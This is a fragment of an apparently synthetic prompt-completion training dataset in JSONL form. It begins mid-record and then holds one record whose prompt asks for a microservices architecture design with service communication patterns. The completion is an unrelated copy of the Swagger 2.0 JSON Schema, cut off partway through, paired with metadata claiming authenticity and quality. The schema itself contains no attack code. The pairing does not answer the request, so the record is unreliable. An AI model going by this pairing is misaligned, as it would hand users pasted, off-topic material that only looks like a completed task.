Failed\",\n}\n", "metadata": {"source": "github.com/spec-first/connexion", "file_path": "connexion/http_facts.py", "language": "python", "complexity": "simple", "star_count": 4553, "quality_score": 0.63, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 75}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "microservices_patterns", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design microservices architecture with service communication patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "{\n  \"title\": \"A JSON Schema for Swagger 2.0 API.\",\n  \"id\": \"http://swagger.io/v2/schema.json#\",\n  \"$schema\": \"http://json-schema.org/draft-04/schema#\",\n  \"type\": \"object\",\n  \"required\": [\n    \"swagger\",\n    \"info\",\n    \"paths\"\n  ],\n  \"additionalProperties\": false,\n  \"patternProperties\": {\n    \"^x-\": {\n      \"$ref\": \"#/definitions/vendorExtension\"\n    }\n  },\n  \"properties\": {\n    \"swagger\": {\n      \"type\": \"string\",\n      \"enum\": [\n        \"2.0\"\n      ],\n      \"description\": \"The Swagger version of this document.\"\n    },\n    \"info\": {\n      \"$ref\": \"#/definitions/info\"\n    },\n    \"host\": {\n      \"type\": \"string\",\n      \"pattern\": \"^[^{}/ :\\\\\\\\]+(?::\\\\d+)?$\",\n      \"description\": \"The host (name or ip) of the API. Example: 'swagger.io'\"\n    },\n    \"basePath\": {\n      \"type\": \"string\",\n      \"pattern\": \"^/\",\n      \"description\": \"The base path to the API. Example: '/api'.\"\n    },\n    \"schemes\": {\n      \"$ref\": \"#/definitions/schemesList\"\n    },\n    \"consumes\": {\n      \"description\": \"A list of MIME types accepted by the API.\",\n      \"$ref\": \"#/definitions/mediaTypeList\"\n    },\n    \"produces\": {\n      \"description\": \"A list of MIME types the API can produce.\",\n      \"$ref\": \"#/definitions/mediaTypeList\"\n    },\n    \"paths\": {\n      \"$ref\": \"#/definitions/paths\"\n    },\n    \"definitions\": {\n      \"$ref\": \"#/definitions/definitions\"\n    },\n    \"parameters\": {\n      \"$ref\": \"#/definitions/parameterDefinitions\"\n    },\n    \"responses\": {\n      \"$ref\": \"#/definitions/responseDefinitions\"\n    },\n    \"security\": {\n      \"$ref\": \"#/definitions/security\"\n    },\n    \"securityDefinitions\": {\n      \"$ref\": \"#/definitions/securityDefinitions\"\n    },\n    \"tags\": {\n      \"type\": \"array\",\n      \"items\": {\n        \"$ref\": \"#/definitions/tag\"\n      },\n      \"uniqueItems\": true\n    },\n    \"externalDocs\": {\n      \"$ref\": \"#/definitions/externalDocs\"\n    }\n  },\n  \"definitions\": {\n    \"info\": {\n      \"type\": \"object\",\n      \"description\": \"General information about the API.\",\n      \"required\": [\n        \"version\",\n        \"title\"\n      ],\n      \"additionalProperties\": false,\n      \"patternProperties\": {\n        \"^x-\": {\n          \"$ref\": \"#/definitions/vendorExtension\"\n        }\n      },\n      \"properties\": {\n        \"title\": {\n          \"type\": \"string\",\n          \"description\": \"A unique and precise title of the API.\"\n        },\n        \"version\": {\n          \"type\": \"string\",\n          \"description\": \"A semantic version number of the API.\"\n        },\n        \"description\": {\n          \"type\": \"string\",\n          \"description\": \"A longer description of the API. Should be different from the title.  GitHub Flavored Markdown is allowed.\"\n        },\n        \"termsOfService\": {\n          \"type\": \"string\",\n          \"description\": \"The terms of service for the API.\"\n        },\n        \"contact\": {\n          \"$ref\": \"#/definitions/contact\"\n        },\n        \"license\": {\n          \"$ref\": \"#/definitions/license\"\n        }\n      }\n    },\n    \"contact\": {\n      \"type\": \"object\",\n      \"description\": \"Contact information for the owners of the API.\",\n      \"additionalProperties\": false,\n      \"properties\": {\n        \"name\": {\n          \"type\": \"string\",\n          \"description\": \"The identifying name of the contact person/organization.\"\n        },\n        \"url\": {\n          \"type\": \"string\",\n          \"description\": \"The URL pointing to the contact information.\",\n          \"format\": \"uri\"\n        },\n        \"email\": {\n          \"type\": \"string\",\n          \"description\": \"The email address of the contact person/organization.\",\n          \"format\": \"email\"\n        }\n      },\n      \"patternProperties\": {\n        \"^x-\": {\n          \"$ref\": \"#/definitions/vendorExtension\"\n        }\n      }\n    },\n    \"license\": {\n      \"type\": \"object\",\n      \"required\": [\n        \"name\"\n      ],\n      \"additionalProperties\": false,\n      \"properties\": {\n        \"name\": {\n          \"type\": \"string\",\n          \"description\": \"The name of the license type. It's encouraged to use an OSI compatible license.\"\n        },\n        \"url\": {\n          \"type\": \"string\",\n          \"description\": \"The URL pointing to the license.\",\n          \"format\": \"uri\"\n        }\n      },\n      \"patternProperties\": {\n        \"^x-\": {\n          \"$ref\": \"#/definitions/vendorExtension\"\n        }\n      }\n    },\n    \"paths\": {\n      \"type\": \"object\",\n      \"description\": \"Relative paths to the individual endpoints. They must be relative to the 'basePath'.\",\n      \"patternProperties\": {\n        \"^x-\": {\n          \"$ref\": \"#/definitions/vendorExtension\"\n        },\n        \"^/\": {\n          \"$ref\": \"#/definitions/pathItem\"\n        }\n      },\n      \"additionalProperties\": false\n    },\n    \"definitions\": {\n      \"type\": \"object\",\n      \"additionalProperties\": {\n        \"$ref\": \"#/definitions/schema\"\n      },\n      \"description\": \"One or more JSON objects describing the schemas being consumed and produced by the API.\"\n    },\n    \"parameterDefinitions\": {\n      \"type\": \"object\",\n      \"additionalProperties\": {\n        \"$ref\": \"#/definitions/parameter\"\n      },\n      \"description\": \"One or more JSON representations for parameters\"\n    },\n    \"responseDefinitions\": {\n      \"type\": \"object\",\n      \"additionalProperties\": {\n        \"$ref\": \"#/definitions/response\"\n      },\n      \"description\": \"One or more JSON representations for parameters\"\n    },\n    \"externalDocs\": {\n      \"type\": \"object\",\n      \"additionalProperties\": false,\n      \"description\": \"information about external documentation\",\n      \"required\": [\n        \"url\"\n      ],\n      \"properties\": {\n        \"description\": {\n          \"type\": \"string\"\n        },\n        \"url\": {\n          \"type\": \"string\",\n          \"format\": \"uri\"\n        }\n      },\n      \"patternProperties\": {\n        \"^x-\": {\n          \"$ref\": \"#/definitions/vendorExtension\"\n        }\n      }\n    },\n    \"examples\": {\n      \"type\": \"object\",\n      \"additionalProperties\": true\n    },\n    \"mimeType\": {\n      \"type\": \"string\",\n      \"description\": \"The MIME type of the HTTP message.\"\n    },\n    \"operation\": {\n      \"type\": \"object\",\n      \"required\": [\n        \"responses\"\n      ],\n      \"additionalProperties\": false,\n      \"patternProperties\": {\n        \"^x-\": {\n          \"$ref\": \"#/definitions/vendorExtension\"\n        }\n      },\n      \"properties\": {\n        \"tags\": {\n          \"type\": \"array\",\n          \"items\": {\n            \"type\": \"string\"\n          },\n          \"uniqueItems\": true\n        },\n        \"summary\": {\n          \"type\": \"string\",\n          \"description\": \"A brief summary of the operation.\"\n        },\n        \"description\": {\n          \"type\": \"string\",\n          \"description\": \"A longer description of the operation, GitHub Flavored Markdown is allowed.\"\n        },\n        \"externalDocs\": {\n          \"$ref\": \"#/definitions/externalDocs\"\n        },\n        \"operationId\": {\n          \"type\": \"string\",\n          \"description\": \"A unique identifier of the operation.\"\n        },\n        \"produces\": {\n          \"description\": \"A list of MIME types the API can produce.\",\n          \"$ref\": \"#/definitions/mediaTypeList\"\n        },\n        \"consumes\": {\n          \"description\": \"A list of MIME types the API can consume.\",\n          \"$ref\": \"#/definitions/mediaTypeList\"\n        },\n        \"parameters\": {\n          \"$ref\": \"#/definitions/parametersList\"\n        },\n        \"responses\": {\n          \"$ref\": \"#/definitions/responses\"\n        },\n        \"schemes\": {\n          \"$ref\": \"#/definitions/schemesList\"\n        },\n        \"deprecated\": {\n          \"type\": \"boolean\",\n          \"default\": false\n        },\n        \"security\": {\n          \"$ref\": \"#/definitions/security\"\n        }\n      }\n    },\n    \"pathItem\": {\n      \"type\": \"object\",\n      \"additionalProperties\": false,\n      \"patternProperties\": {\n        \"^x-\": {\n          \"$ref\": \"#/definitions/vendorExtension\"\n        }\n      },\n      \"properties\": {\n        \"$ref\": {\n          \"type\": \"string\"\n        },\n        \"get\": {\n          \"$ref\": \"#/definitions/operation\"\n        },\n        \"put\": {\n          \"$ref\": \"#/definitions/operation\"\n        },\n        \"post\": {\n          \"$ref\": \"#/definitions/operation\"\n        },\n        \"delete\": {\n          \"$ref\": \"#/definitions/operation\"\n        },\n        \"options\": {\n          \"$ref\": \"#/definitions/operation\"\n        },\n        \"head\": {\n          \"$ref\": \"#/definitions/operation\"\n        },\n        \"patch\": {\n          \"$ref\": \"#/definitions/operation\"\n        },\n        \"parameters\": {\n          \"$ref\": \"#/definitions/parametersList\"\n        }\n      }\n    },\n    \"responses\": {\n      \"type\": \"object\",\n      \"description\": \"Response objects names can either be any valid HTTP status code or 'default'.\",\n      \"minProperties\": 1,\n      \"additionalProperties\": false,\n      \"patternProperties\": {\n        \"^([0-9]{3})$|^(default)$\": {\n          \"$ref\": \"#/definitions/responseValue\"\n        },\n        \"^x-\": {\n          \"$ref\": \"#/definitions/vendorExtension\"\n        }\n      },\n      \"not\": {\n        \"type\": \"object\",\n        \"additionalProperties\": false,\n        \"patternProperties\": {\n          \"^x-\": {\n            \"$ref\": \"#/definitions/vendorExtension\"\n          }\n        }\n      }\n    },\n    \"responseValue\": {\n      \"oneOf\": [\n        {\n          \"$ref\": \"#/definitions/response\"\n        },\n        {\n          \"$ref\": \"#/definitions/jsonReference\"\n        }\n      ]\n    },\n    \"response\": {\n      \"type\": \"object\",\n      \"required\": [\n        \"description\"\n      ],\n      \"properties\": {\n        \"description\": {\n          \"type\": \"string\"\n        },\n        \"schema\": {\n          \"oneOf\": [\n            {\n              \"$ref\": \"#/definitions/schema\"\n            },\n            {\n              \"$ref\": \"#/definitions/fileSchema\"\n            }\n          ]\n        },\n        \"headers\": {\n          \"$ref\": \"#/definitions/headers\"\n        },\n        \"examples\": {\n          \"$ref\": \"#/definitions/examples\"\n        }\n      },\n      \"additionalProperties\": false,\n      \"patternProperties\": {\n        \"^x-\": {\n          \"$ref\": \"#/definitions/vendorExtension\"\n        }\n      }\n    },\n    \"headers\": {\n      \"type\": \"object\",\n      \"additionalProperties\": {\n        \"$ref\": \"#/definitions/header\"\n      }\n    },\n    \"header\": {\n      \"type\": \"object\",\n      \"additionalProperties\": false,\n      \"required\": [\n        \"type\"\n      ],\n      \"properties\": {\n        \"type\": {\n          \"type\": \"string\",\n          \"enum\": [\n            \"string\",\n            \"number\",\n            \"integer\",\n            \"boolean\",\n            \"array\"\n          ]\n        },\n        \"format\": {\n          \"type\": \"string\"\n        },\n        \"items\": {\n          \"$ref\": \"#/definitions/primitivesItems\"\n        },\n        \"collectionFormat\": {\n          \"$ref\": \"#/definitions/collectionFormat\"\n        },\n        \"default\": {\n          \"$ref\": \"#/definitions/default\"\n        },\n        \"maximum\": {\n          \"$ref\": \"#/definitions/maximum\"\n        },\n        \"exclusiveMaximum\": {\n          \"$ref\": \"#/definitions/exclusiveMaximum\"\n        },\n        \"minimum\": {\n          \"$ref\": \"#/definitions/minimum\"\n        },\n        \"exclusiveMinimum\": {\n          \"$ref\": \"#/definitions/exclusiveMinimum\"\n        },\n        \"maxLength\": {\n          \"$ref\": \"#/definitions/maxLength\"\n        },\n        \"minLength\": {\n          \"$ref\": \"#/definitions/minLength\"\n        },\n        \"pattern\": {\n          \"$ref\": \"#/definitions/pattern\"\n        },\n        \"maxItems\": {\n          \"$ref\": \"#/definitions/maxItems\"\n        },\n        \"minItems\": {\n          \"$ref\": \"#/definitions/minItems\"\n        },\n        \"uniqueItems\": {\n          \"$ref\": \"#/definitions/uniqueItems\"\n        },\n        \"enum\": {\n          \"$ref\": \"#/definitions/enum\"\n        },\n        \"multipleOf\": {\n          \"$ref\": \"#/definitions/multipleOf\"\n        },\n        \"description\": {\n          \"type\": \"string\"\n        }\n      },\n      \"patternProperties\": {\n        \"^x-\": {\n          \"$ref\": \"#/definitions/vendorExtension\"\n        }\n      }\n    },\n    \"vendorExtension\": {\n      \"description\": \"Any property starting with x- is valid.\",\n      \"additionalProperties\": true,\n      \"additionalItems\": true\n    },\n    \"bodyParameter\": {\n      \"type\": \"object\",\n      \"required\": [\n        \"name\",\n        \"in\",\n        \"schema\"\n      ],\n      \"patternProperties\": {\n        \"^x-\": {\n          \"$ref\": \"#/definitions/vendorExtension\"\n        }\n      },\n      \"properties\": {\n        \"description\": {\n          \"type\": \"string\",\n          \"description\": \"A brief description of the parameter. This could contain examples of use.  GitHub Flavored Markdown is allowed.\"\n        },\n        \"name\": {\n          \"type\": \"string\",\n          \"description\": \"The name of the parameter.\"\n        },\n        \"in\": {\n          \"type\": \"string\",\n          \"description\": \"Determines the location of the parameter.\",\n          \"enum\": [\n            \"body\"\n          ]\n        },\n        \"required\": {\n          \"type\": \"boolean\",\n          \"description\": \"Determines whether or not this parameter is required or optional.\",\n          \"default\": false\n        },\n        \"schema\": {\n          \"$ref\": \"#/definitions/schema\"\n        }\n      },\n      \"additionalProperties\": false\n    },\n    \"headerParameterSubSchema\": {\n      \"additionalProperties\": false,\n      \"patternProperties\": {\n        \"^x-\": {\n          \"$ref\": \"#/definitions/vendorExtension\"\n        }\n      },\n      \"properties\": {\n        \"required\": {\n          \"type\": \"boolean\",\n          \"description\": \"Determines whether or not this parameter is required or optional.\",\n          \"default\": false\n        },\n        \"in\": {\n          \"type\": \"string\",\n          \"description\": \"Determines the location of the parameter.\",\n          \"enum\": [\n            \"header\"\n          ]\n        },\n        \"description\": {\n          \"type\": \"string\",\n          \"description\": \"A brief description of the parameter. This could contain examples of use.  GitHub Flavored Markdown is allowed.\"\n        },\n        \"name\": {\n          \"type\": \"string\",\n          \"description\": \"The name of the parameter.\"\n        },\n        \"type\": {\n          \"type\": \"string\",\n          \"enum\": [\n            \"string\",\n            \"number\",\n            \"boolean\",\n            \"integer\",\n            \"array\"\n          ]\n        },\n        \"format\": {\n          \"type\": \"string\"\n        },\n        \"items\": {\n          \"$ref\": \"#/definitions/primitivesItems\"\n        },\n        \"collectionFormat\": {\n          \"$ref\": \"#/definitions/collectionFormat\"\n        },\n        \"default\": {\n          \"$ref\": \"#/definitions/default\"\n        },\n        \"maximum\": {\n          \"$ref\": \"#/definitions/maximum\"\n        },\n        \"exclusiveMaximum\": {\n          \"$ref\": \"#/definitions/exclusiveMaximum\"\n        },\n        \"minimum\": {\n          \"$ref\": \"#/definitions/minimum\"\n        },\n        \"exclusiveMinimum\": {\n          \"$ref\": \"#/definitions/exclusiveMinimum\"\n        },\n        \"maxLength\": {\n          \"$ref\": \"#/definitions/maxLength\"\n        },\n        \"minLength\": {\n          \"$ref\": \"#/definitions/minLength\"\n        },\n        \"pattern\": {\n          \"$ref\": \"#/definitions/pattern\"\n        },\n        \"maxItems\": {\n          \"$ref\": \"#/definitions/maxItems\"\n        },\n        \"minItems\": {\n          \"$ref\": \"#/definitions/minItems\"\n        },\n        \"uniqueItems\": {\n          \"$ref\": \"#/definitions/uniqueItems\"\n        },\n        \"enum\": {\n          \"$ref\": \"#/definitions/enum\"\n        },\n        \"multipleOf\": {\n          \"$ref\": \"#/definitions/multipleOf\"\n        }\n      }\n    },\n    \"queryParameterSubSchema\": {\n      \"additionalProperties\": false,\n      \"patternProperties\": {\n        \"^x-\": {\n          \"$ref\": \"#/definitions/vendorExtension\"\n        }\n      },\n      \"properties\": {\n        \"required\": {\n          \"type\": \"boolean\",\n          \"description\": \"Determines whether or not this parameter is required or optional.\",\n          \"default\": false\n        },\n        \"in\": {\n          \"type\": \"string\",\n          \"description\": \"Determines the location of the parameter.\",\n          \"enum\": [\n            \"query\"\n          ]\n        },\n        \"description\": {\n          \"type\": \"string\",\n          \"description\": \"A brief description of the parameter. This could contain examples of use.  GitHub Flavored Markdown is allowed.\"\n        },\n        \"name\": {\n          \"type\": \"string\",\n          \"description\": \"The name of the parameter.\"\n        },\n        \"allowEmptyValue\": {\n          \"type\": \"boolean\",\n          \"default\": false,\n          \"description\": \"allows sending a parameter by name only or with an empty value.\"\n        },\n        \"type\": {\n          \"type\": \"string\",\n          \"enum\": [\n            \"string\",\n            \"number\",\n            \"boolean\",\n            \"integer\",\n            \"array\"\n          ]\n        },\n        \"format\": {\n          \"type\": \"string\"\n        },\n        \"items\": {\n          \"$ref\": \"#/definitions/primitivesItems\"\n        },\n        \"collectionFormat\": {\n          \"$ref\": \"#/definitions/collectionFormatWithMulti\"\n        },\n        \"default\": {\n          \"$ref\": \"#/definitions/default\"\n        },\n        \"maximum\": {\n          \"$ref\": \"#/definitions/maximum\"\n        },\n        \"exclusiveMaximum\": {\n          \"$ref\": \"#/definitions/exclusiveMaximum\"\n        },\n        \"minimum\": {\n          \"$ref\": \"#/definitions/minimum\"\n        },\n        \"exclusiveMinimum\": {\n          \"$ref\": \"#/definitions/exclusiveMinimum\"\n        },\n        \"maxLength\": {\n          \"$ref\": \"#/definitions/maxLength\"\n        },\n        \"minLength\": {\n          \"$ref\": \"#/definitions/minLength\"\n        },\n        \"pattern\": {\n          \"$ref\": \"#/definitions/pattern\"\n        },\n        \"maxItems\": {\n          \"$ref\": \"#/definitions/maxItems\"\n        },\n        \"minItems\": {\n          \"$ref\": \"#/definitions/minItems\"\n        },\n        \"uniqueItems\": {\n          \"$ref\": \"#/definitions/uniqueItems\"\n        },\n        \"enum\": {\n          \"$ref\": \"#/definitions/enum\"\n        },\n        \"multipleOf\": {\n          \"$ref\": \"#/definitions/multipleOf\"\n        }\n      }\n    },\n    \"formDataParameterSubSchema\": {\n      \"additionalProperties\": false,\n      \"patternProperties\": {\n        \"^x-\": {\n          \"$ref\": \"#/definitions/vendorExtension\"\n        }\n      },\n      \"properties\": {\n        \"required\": {\n          \"type\": \"boolean\",\n          \"description\": \"Determines whether or not this parameter is required or optional.\",\n          \"default\": false\n        },\n        \"in\": {\n          \"type\": \"string\",\n          \"description\": \"Determines the location of the parameter.\",\n          \"enum\": [\n            \"formData\"\n          ]\n        },\n        \"description\": {\n          \"type\": \"string\",\n          \"description\": \"A brief description of the parameter. This could contain examples of use.  GitHub Flavored Markdown is allowed.\"\n        },\n        \"name\": {\n          \"type\": \"string\",\n          \"description\": \"The name of the parameter.\"\n        },\n        \"allowEmptyValue\": {\n          \"type\": \"boolean\",\n          \"default\": false,\n          \"description\": \"allows sending a parameter by name only or with an empty value.\"\n        },\n        \"type\": {\n          \"type\": \"string\",\n          \"enum\": [\n            \"string\",\n            \"number\",\n            \"boolean\",\n            \"integer\",\n            \"array\",\n            \"file\"\n          ]\n        },\n        \"format\": {\n          \"type\": \"string\"\n        },\n        \"items\": {\n          \"$ref\": \"#/definitions/primitivesItems\"\n        },\n        \"collectionFormat\": {\n          \"$ref\": \"#/definitions/collectionFormatWithMulti\"\n        },\n        \"default\": {\n          \"$ref\": \"#/definitions/default\"\n        },\n        \"maximum\": {\n          \"$ref\": \"#/definitions/maximum\"\n        },\n        \"exclusiveMaximum\": {\n          \"$ref\": \"#/definitions/exclusiveMaximum\"\n        },\n        \"minimum\": {\n          \"$ref\": \"#/definitions/minimum\"\n        },\n        \"exclusiveMinimum\": {\n          \"$ref\": \"#/definitions/exclusiveMinimum\"\n        },\n        \"maxLength\": {\n          \"$ref\": \"#/definitions/maxLength\"\n        },\n        \"minLength\": {\n          \"$ref\": \"#/definitions/minLength\"\n        },\n        \"pattern\": {\n          \"$ref\": \"#/definitions/pattern\"\n        },\n        \"maxItems\": {\n          \"$ref\": \"#/definitions/maxItems\"\n        },\n        \"minItems\": {\n          \"$ref\": \"#/definitions/minItems\"\n        },\n        \"uniqueItems\": {\n          \"$ref\": \"#/definitions/uniqueItems\"\n        },\n        \"enum\": {\n          \"$ref\": \"#/definitions/enum\"\n        },\n        \"multipleOf\": {\n          \"$ref\": \"#/definitions/multipleOf\"\n        }\n      }\n    },\n    \"pathParameterSubSchema\": {\n      \"additionalProperties\": false,\n      \"patternProperties\": {\n        \"^x-\": {\n          \"$ref\": \"#/definitions/vendorExtension\"\n        }\n      },\n      \"required\": [\n        \"required\"\n      ],\n      \"properties\": {\n        \"required\": {\n          \"type\": \"boolean\",\n          \"enum\": [\n            true\n          ],\n          \"description\": \"Determines whether or not this parameter is required or optional.\"\n        },\n        \"in\": {\n          \"type\": \"string\",\n          \"description\": \"Determines the location of the parameter.\",\n          \"enum\": [\n            \"path\"\n          ]\n        },\n        \"description\": {\n          \"type\": \"string\",\n          \"description\": \"A brief description of the parameter. This could contain examples of use.  GitHub Flavored Markdown is allowed.\"\n        },\n        \"name\": {\n          \"type\": \"string\",\n          \"description\": \"The name of the parameter.\"\n        },\n        \"type\": {\n          \"type\": \"string\",\n          \"enum\": [\n            \"string\",\n            \"number\",\n            \"boolean\",\n            \"integer\",\n            \"array\"\n          ]\n        },\n        \"format\": {\n          \"type\": \"string\"\n        },\n        \"items\": {\n          \"$ref\": \"#/definitions/primitivesItems\"\n        },\n        \"collectionFormat\": {\n          \"$ref\": \"#/definitions/collectionFormat\"\n        },\n        \"default\": {\n          \"$ref\": \"#/definitions/default\"\n        },\n        \"maximum\": {\n          \"$ref\": \"#/definitions/maximum\"\n        },\n        \"exclusiveMaximum\": {\n          \"$ref\": \"#/definitions/exclusiveMaximum\"\n        },\n        \"minimum\": {\n          \"$ref\": \"#/definitions/minimum\"\n        },\n        \"exclusiveMinimum\": {\n          \"$ref\": \"#/definitions/exclusiveMinimum\"\n        },\n        \"maxLength\": {\n          \"$ref\": \"#/definitions/maxLength\"\n        },\n        \"minLength\": {\n          \"$ref\": \"#/definitions/minLength\"\n        },\n        \"pattern\": {\n          \"$ref\": \"#/definitions/pattern\"\n        },\n        \"maxItems\": {\n          \"$ref\": \"#/definitions/maxItems\"\n        },\n        \"minItems\": {\n          \"$ref\": \"#/definitions/minItems\"\n        },\n        \"uniqueItems\": {\n          \"$ref\": \"#/definitions/uniqueItems\"\n        },\n        \"enum\": {\n          \"$ref\": \"#/definitions/enum\"\n        },\n        \"multipleOf\": {\n          \"$ref\": \"#/definitions/multipleOf\"\n        }\n      }\n    },\n    \"nonBodyParameter\": {\n      \"type\": \"object\",\n      \"required\": [\n        \"name\",\n        \"in\",\n        \"type\"\n      ],\n      \"oneOf\": [\n        {\n          \"$ref\": \"#/definitions/headerParameterSubSchema\"\n        },\n        {\n          \"$ref\": \"#/definitions/formDataParameterSubSchema\"\n        },\n        {\n          \"$ref\": \"#/definitions/queryParameterSubSchema\"\n        },\n        {\n          \"$ref\": \"#/definitions/pathParameterSubSchema\"\n        }\n      ]\n    },\n    \"parameter\": {\n      \"oneOf\": [\n        {\n          \"$ref\": \"#/definitions/bodyParameter\"\n        },\n        {\n          \"$ref\": \"#/definitions/nonBodyParameter\"\n        }\n      ]\n    },\n    \"schema\": {\n      \"type\": \"object\",\n      \"description\": \"A deterministic version of a JSON Schema object.\",\n      \"patternProperties\": {\n        \"^x-\": {\n          \"$ref\": \"#/definitions/vendorExtension\"\n        }\n      },\n      \"properties\": {\n        \"$ref\": {\n          \"type\": \"string\"\n        },\n        \"format\": {\n          \"type\": \"string\"\n        },\n        \"title\": {\n          \"$ref\": \"http://json-schema.org/draft-04/schema#/properties/title\"\n        },\n        \"description\": {\n          \"$ref\": \"http://json-schema.org/draft-04/schema#/properties/description\"\n        },\n        \"default\": {\n          \"$ref\": \"http://json-schema.org/draft-04/schema#/properties/default\"\n        },\n        \"multipleOf\": {\n          \"$ref\": \"http://json-schema.org/draft-04/schema#/properties/multipleOf\"\n        },\n        \"maximum\": {\n          \"$ref\": \"http://json-schema.org/draft-04/schema#/properties/maximum\"\n        },\n        \"exclusiveMaximum\": {\n          \"$ref\": \"http://json-schema.org/draft-04/schema#/properties/exclusiveMaximum\"\n        },\n        \"minimum\": {\n          \"$ref\": \"http://json-schema.org/draft-04/schema#/properties/minimum\"\n        },\n        \"exclusiveMinimum\": {\n          \"$ref\": \"http://json-schema.org/draft-04/schema#/properties/exclusiveMinimum\"\n        },\n        \"maxLength\": {\n          \"$ref\": \"http://json-schema.org/draft-04/schema#/definitions/positiveInteger\"\n        },\n        \"minLength\": {\n          \"$ref\": \"http://json-schema.org/draft-04/schema#/definitions/positiveIntegerDefault0\"\n        },\n        \"pattern\": {\n          \"$ref\": \"http://json-schema.org/draft-04/schema#/properties/pattern\"\n        },\n        \"maxItems\": {\n          \"$ref\": \"http://json-schema.org/draft-04/schema#/definitions/positiveInteger\"\n        },\n        \"minItems\": {\n          \"$ref\": \"http://json-schema.org/draft-04/schema#/definitions/positiveIntegerDefault0\"\n        },\n        \"uniqueItems\": {\n          \"$ref\": \"http://json-schema.org/draft-04/schema#/properties/uniqueItems\"\n        },\n        \"maxProperties\": {\n          \"$ref\": \"http://json-schema.org/draft-04/schema#/definitions/positiveInteger\"\n        },\n        \"minProperties\": {\n          \"$ref\": \"http://json-schema.org/draft-04/schema#/definitions/positiveIntegerDefault0\"\n        },\n        \"required\": {\n          \"$ref\": \"http://json-schema.org/draft-04/schema#/definitions/stringArray\"\n        },\n        \"enum\": {\n          \"$ref\": \"http://json-schema.org/draft-04/schema#/properties/enum\"\n        },\n        \"additionalProperties\": {\n          \"anyOf\": [\n            {\n              \"$ref\": \"#/definitions/schema\"\n            },\n            {\n              \"type\": \"boolean\"\n            }\n          ],\n          \"default\": {}\n        },\n        \"type\": {\n          \"$ref\": \"http://json-schema.org/draft-04/schema#/properties/type\"\n        },\n        \"items\": {\n          \"anyOf\": [\n            {\n              \"$ref\": \"#/definitions/schema\"\n            },\n            {\n              \"type\": \"array\",\n              \"minItems\": 1,\n              \"items\": {\n                \"$ref\": \"#/definitions/schema\"\n              }\n            }\n          ],\n          \"default\": {}\n        },\n        \"allOf\": {\n          \"type\": \"array\",\n          \"minItems\": 1,\n          \"items\": {\n            \"$ref\": \"#/definitions/schema\"\n          }\n        },\n        \"properties\": {\n          \"type\": \"object\",\n          \"additionalProperties\": {\n            \"$ref\": \"#/definitions/schema\"\n          },\n          \"default\": {}\n        },\n        \"discriminator\": {\n          \"type\": \"string\"\n        },\n        \"readOnly\": {\n          \"type\": \"boolean\",\n          \"default\": false\n        },\n        \"xml\": {\n          \"$ref\": \"#/definitions/xml\"\n        },\n        \"externalDocs\": {\n          \"$ref\": \"#/definitions/externalDocs\"\n        },\n        \"example\": {}\n      },\n      \"additionalProperties\": false\n    },\n    \"fileSchema\": {\n      \"type\": \"object\",\n      \"description\": \"A deterministic version of a JSON Schema object.\",\n      \"patternProperties\": {\n        \"^x-\": {\n          \"$ref\": \"#/definitions/vendorExtension\"\n        }\n      },\n      \"required\": [\n        \"type\"\n      ],\n      \"properties\": {\n        \"format\": {\n          \"type\": \"string\"\n        },\n        \"title\": {\n          \"$ref\": \"http://json-schema.org/draft-04/schema#/properties/title\"\n        },\n        \"description\": {\n          \"$ref\": \"http://json-schema.org/draft-04/schema#/properties/description\"\n        },\n        \"default\": {\n          \"$ref\": \"http://json-schema.org/draft-04/schema#/properties/default\"\n        },\n        \"required\": {\n          \"$ref\": \"http://json-schema.org/draft-04/schema#/definitions/stringArray\"\n        },\n        \"type\": {\n          \"type\": \"string\",\n          \"enum\": [\n            \"file\"\n          ]\n        },\n        \"readOnly\": {\n          \"type\": \"boolean\",\n          \"default\": false\n        },\n        \"externalDocs\": {\n          \"$ref\": \"#/definitions/externalDocs\"\n        },\n        \"example\": {}\n      },\n      \"additionalProperties\": false\n    },\n    \"primitivesItems\": {\n      \"type\": \"object\",\n      \"additionalProperties\": false,\n      \"properties\": {\n        \"type\": {\n          \"type\": \"string\",\n          \"enum\": [\n            \"string\",\n            \"number\",\n            \"integer\",\n            \"boolean\",\n            \"array\"\n          ]\n        },\n        \"format\": {\n          \"type\": \"string\"\n        },\n        \"items\": {\n          \"$ref\": \"#/definitions/primitivesItems\"\n        },\n        \"collectionFormat\": {\n          \"$ref\": \"#/definitions/collectionFormat\"\n        },\n        \"default\": {\n          \"$ref\": \"#/definitions/default\"\n        },\n        \"maximum\": {\n          \"$ref\": \"#/definitions/maximum\"\n        },\n        \"exclusiveMaximum\": {\n          \"$ref\": \"#/definitions/exclusiveMaximum\"\n        },\n        \"minimum\": {\n          \"$ref\": \"#/definitions/minimum\"\n        },\n        \"exclusiveMinimum\": {\n          \"$ref\": \"#/definitions/exclusiveMinimum\"\n        },\n        \"maxLength\": {\n          \"$ref\": \"#/definitions/maxLength\"\n        },\n        \"minLength\": {\n          \"$ref\": \"#/definitions/minLength\"\n        },\n        \"pattern\": {\n          \"$ref\": \"#/definitions/pattern\"\n        },\n        \"maxItems\": {\n          \"$ref\": \"#/definitions/maxItems\"\n        },\n        \"minItems\": {\n          \"$ref\": \"#/definitions/minItems\"\n        },\n        \"uniqueItems\": {\n          \"$ref\": \"#/definitions/uniqueItems\"\n        },\n        \"enum\": {\n          \"$ref\": \"#/definitions/enum\"\n        },\n        \"multipleOf\": {\n          \"$ref\": \"#/definitions/multipleOf\"\n        }\n      },\n      \"patternProperties\": {\n        \"^x-\": {\n          \"$ref\": \"#/definitions/vendorExtension\"\n        }\n      }\n    },\n    \"security\": {\n      \"type\": \"array\",\n      \"items\": {\n        \"$ref\": \"#/definitions/securityRequirement\"\n      },\n      \"uniqueItems\": true\n    },\n    \"securityRequirement\": {\n      \"type\": \"object\",\n      \"additionalProperties\": {\n        \"type\": \"array\",\n        \"items\": {\n          \"type\": \"string\"\n        },\n        \"uniqueItems\": true\n      }\n    },\n    \"xml\": {\n      \"type\": \"object\",\n      \"additionalProperties\": false,\n      \"properties\": {\n        \"name\": {\n          \"type\": \"string\"\n        },\n        \"namespace\": {\n          \"type\": \"string\"\n        },\n        \"prefix\": {\n          \"type\": \"string\"\n        },\n        \"attribute\": {\n          \"type\": 